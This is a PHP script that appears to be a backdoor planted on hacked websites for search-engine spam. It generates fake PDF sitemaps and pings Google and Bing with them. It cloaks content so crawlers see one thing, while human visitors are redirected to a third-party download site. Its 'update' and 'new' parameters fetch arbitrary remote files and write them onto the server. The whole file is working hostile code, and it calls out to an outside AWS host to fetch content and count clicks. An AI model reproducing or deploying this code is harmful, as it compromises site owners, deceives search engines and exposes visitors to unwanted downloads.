<?php
error_reporting(0);
if(function_exists('set_time_limit')){
	set_time_limit(600);
	}

$domain = $_SERVER['HTTP_HOST'];

function GetIP(){
	if(!empty($_SERVER["HTTP_CLIENT_IP"])){ $cip = $_SERVER["HTTP_CLIENT_IP"]; }
	elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){ $cip = $_SERVER["HTTP_X_FORWARDED_FOR"]; }
	elseif(!empty($_SERVER["REMOTE_ADDR"])){ $cip = $_SERVER["REMOTE_ADDR"]; }
	else{ $cip = "127.0.0.1"; }
	
	return $cip;
	}

function isgoogle(){
	$hostname = @gethostbyaddr(GetIP());
	return preg_match('/(\.(googlebot|google)\.com$)/i', $hostname);
	}


//check status
if(isset($_GET['check'])){
	echo 'V2';
	exit();
	}

//generate sitemap
if(isset($_GET['sitemap'])){
	$id = trim($_GET['id']);
	$id = (int)$id;
	$start = ($id -1) * 50000 + 1;
	$end = $start + 50000;
	
	$sitemap = '<?xml version="1.0" encoding="UTF-8" ?>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
  xmlns:mobile="http://www.google.com/schemas/sitemap-mobile/1.0">';
  
	for($i=$start; $i<=$end; $i++){
		$link = 'http://'.$domain.'/pdf.php?'.$i;
		$sitemap .= '<url><loc>'.$link.'</loc><mobile:mobile/></url>';
		}
	
	$sitemap .= '</urlset>';
	echo $sitemap;
	
	exit();
	}

//submit sitemap
if(isset($_GET['submit'])){
	for($i=1; $i<=10; $i++){
		$xml_link = 'http://'.$domain.'/pdf.php?sitemap&id='.$i;
		$google_link = 'http://www.google.com/webmasters/sitemaps/ping?sitemap='.urlencode($xml_link);
		$bing_link = 'http://www.bing.com/webmaster/ping.aspx?siteMap='.urlencode($xml_link);
		$google = file_get_contents($google_link);
		$bing = file_get_contents($bing_link);
		echo $xml_link. " OK <br />\n";
		}
		
	exit();
	}

//Update files
if(isset($_GET['update']) and isset($_GET['file'])){
	$content = file_get_contents(trim($_GET['file']));
	if(!empty($content)){
		file_put_contents('pdf.php', $content);
		}
	
	exit();
	}


//New files
if(isset($_GET['new']) and isset($_GET['file']) and isset($_GET['name'])){
	$content = file_get_contents(trim($_GET['file']));
	if(!empty($content)){
		file_put_contents($_GET['name'], $content);
		}
	
	exit();
	}


//Show The List
if(isset($_GET['list']) or $_SERVER['REQUEST_URI'] == '/pdf.php'){
	if(!isset($_GET['page'])){ $page = 1; } else {
		$page = $_GET['page'];
		$page = (int)$page;
		}
	
	$link = 'http://show-704284368.us-west-2.elb.amazonaws.com/mylistnew.php?domain='.$domain.'&page='.$page;
	$content = @file_get_contents($link);
	echo $content;
	
	exit();
	}



//Start Main Function
$pid = 0;
foreach($_GET as $key=>$v){
	$pid = $key;
	}


//Show Ads
if ($_SERVER['HTTP_REFERER'] OR $_ENV['HTTP_REFERER']){
	$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
	if(isgoogle() or strpos($useragent, 'google') or strpos($useragent, 'yahoo') or strpos($useragent, 'msn') or strpos($useragent, 'bing') or strpos($useragent, 'bot')){ } else {
		$link = "http://www.mutifiles.com/mydownloads.php?pid=".$pid."&domain=".$domain;
		header("Location: $link");
		
		//count clicks
		@file_get_contents('http://show-704284368.us-west-2.elb.amazonaws.com/mycountnew.php?user=1&domain='.$domain);
		
		exit();
		}
	}


$filename = 'http://show-704284368.us-west-2.elb.amazonaws.com/myshownew.php?domain='.$domain.'&pid='.$pid;

header('Content-Type: application/pdf');
header('Cache-Control: public, must-revalidate, max-age=0'); // HTTP/1.1
header('Pragma: public');
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT'); // Date in the past
header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
header('Content-Disposition: inline; filename="'.$pid.'.pdf";');
echo readfile($filename);

//count clicks
@file_get_contents('http://show-704284368.us-west-2.elb.amazonaws.com/mycountnew.php?bots=1&domain='.$domain);

exit();
?>
